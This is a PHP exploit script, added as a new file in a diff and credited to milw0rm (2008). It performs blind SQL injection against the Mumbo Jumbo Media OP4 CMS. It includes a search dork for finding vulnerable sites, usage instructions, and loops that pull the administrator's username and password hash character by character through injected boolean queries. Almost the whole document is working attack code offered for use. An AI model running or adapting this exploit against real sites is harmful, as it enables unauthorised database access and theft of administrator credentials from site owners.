@@ -1,0 +1,71 @@
+<?php
+ini_set("max_execution_time",0);
+print_r('
+###############################################################
+#
+#   Mumbo Jumbo Media - OP4 - Blind SQL Injection Exploit     
+#                                                             
+#      Vulnerability discovered by: Lidloses_Auge             
+#      Exploit coded by:            Lidloses_Auge
+#      Greetz to:                   Free-Hack, GPM
+#      Date:                        13.04.2008
+#
+###############################################################
+#                                                             
+#      Dork:  "mumbo jumbo media" + inurl:"index.php"
+#      Usage: php '.$argv[0].' [Target] [Page ID] [Admin ID]
+#      Example for "http://www.site.com/cms/index.php?id=300"
+#      => php '.$argv[0].' http://www.site.com/cms/ 300 1
+#                                                             
+###############################################################
+');
+if ($argc > 1) {
+print_r('
+');
+   echo 'Searching for Admin: ';
+   for($i=1; $i <= 50; $i++) { 
+      $temp1 = file_get_contents($argv[1].'index.php?id='.$argv[2].'+and+length((select+kennung+from+op4_admin+where+id='.$argv[3].'))='.$i.'--');
+      if (strpos($temp1,'Die angeforderte Seite existiert nicht') == 0) {
+         $adlen = $i;
+         $i = 50;
+      }
+   }
+   for($i=1; $i <= $adlen; $i++) {
+      for($zahl=48; $zahl <= 122; $zahl++) {
+         $temp = file_get_contents($argv[1].'index.php?id='.$argv[2].'+and+ascii(substring((select+kennung+from+op4_admin+where+id='.$argv[3].'),'.$i.',1))='.$zahl.'--');
+         if (strpos($temp,'Die angeforderte Seite existiert nicht') == 0) {
+            echo chr($zahl);
+            $zahl = 122;
+         }
+         if ($zahl == 57) {
+            $zahl = 96;
+         }
+      }
+   }
+print_r('
+');
+   echo 'Searching for Hash:  ';
+   for($i=1; $i <= 32; $i++) { 
+      for($zahl=48; $zahl <= 102; $zahl++) {
+         if ($check = 0) {
+            $temp2 = file_get_contents($argv[1].'index.php?id='.$argv[2].'+and+ascii(substring((select+passwort+from+op4_admin+where+id='.$argv[3].'),'.$i.',1))<97--');
+            if (strpos($temp2,'Die angeforderte Seite existiert nicht') == 0) {
+               $zahl = 97;
+               $check = 1;
+            }
+         }
+         $temp = file_get_contents($argv[1].'index.php?id='.$argv[2].'+and+ascii(substring((select+passwort+from+op4_admin+where+id='.$argv[3].'),'.$i.',1))='.$zahl.'--');
+         if (strpos($temp,'Die angeforderte Seite existiert nicht') == 0) {
+            echo chr($zahl);
+            $zahl = 102;
+         }
+         if ($zahl == 57) {
+            $zahl = 97;
+         }
+      }
+      $check = 0;
+   }
+}
+?>
+
+# milw0rm.com [2008-04-13]
